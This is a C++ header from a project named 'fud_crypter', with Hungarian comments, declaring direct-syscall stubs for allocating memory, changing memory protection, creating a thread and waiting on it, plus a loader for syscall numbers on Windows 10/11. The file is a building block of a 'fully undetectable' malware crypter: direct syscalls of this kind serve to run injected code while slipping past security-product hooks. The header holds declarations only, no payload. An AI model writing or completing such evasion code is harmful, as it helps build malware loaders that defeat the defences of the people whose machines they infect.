#pragma once
#include <windows.h>
#include <winternl.h>
#include <cstdint>   // <-- HIÁNYZOTT
#include <string>    // <-- HIÁNYZOTT

namespace fud_crypter {
namespace syscall {

// Syscall számok (Windows 10/11 – dinamikusan töltjük)
extern uint32_t NtAllocateVirtualMemory_SSN;
extern uint32_t NtProtectVirtualMemory_SSN;
extern uint32_t NtCreateThreadEx_SSN;
extern uint32_t NtWaitForSingleObject_SSN;

// Syscall stubok (assembly)
extern "C" {
    NTSTATUS syscall_NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    NTSTATUS syscall_NtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );

    NTSTATUS syscall_NtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList   // <-- PPS_ATTRIBUTE_LIST helyett PVOID
    );

    NTSTATUS syscall_NtWaitForSingleObject(
        HANDLE Handle,
        BOOLEAN Alertable,
        PLARGE_INTEGER Timeout
    );
}

// Dinamikus SSN betöltő
void load_syscall_numbers();

} // namespace syscall
} // namespace fud_crypter
